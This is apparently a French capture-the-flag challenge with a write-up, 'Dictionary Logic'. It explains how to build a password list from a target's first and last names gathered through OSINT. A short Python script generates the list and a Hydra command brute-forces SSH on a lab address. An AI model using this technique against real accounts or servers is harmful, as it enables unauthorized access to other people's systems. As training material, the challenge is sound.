# 27 - Dictionary Logic

## Nom du Challenge
Dictionary Logic

## Description
Le mot de passe suit un schéma Nom+Prénom d'une cible surveillée. Il faut générer un dictionnaire logique.

## Difficulté
Moyen

## Points
150 pts

## Format du Flag
IPNET{mot_de_passe_ou_cle}

## Hints
1. Collecte les identités dans les notes OSINT.
2. Concatène Nom et Prénom en plusieurs variantes.
3. Teste le dictionnaire généré avec Hydra ou John.

## Solution (Write-up)
```bash
python - <<'PY'
first=['alice','marc']
last=['dupont','martin']
with open('/tmp/name_dict.txt','w') as f:
    for fn in first:
        for ln in last:
            f.write(f"{ln}{fn}\n{fn}{ln}\n{ln.capitalize()}{fn}\n")
PY
hydra -l analyst -P /tmp/name_dict.txt ssh://10.10.10.27 -f
```
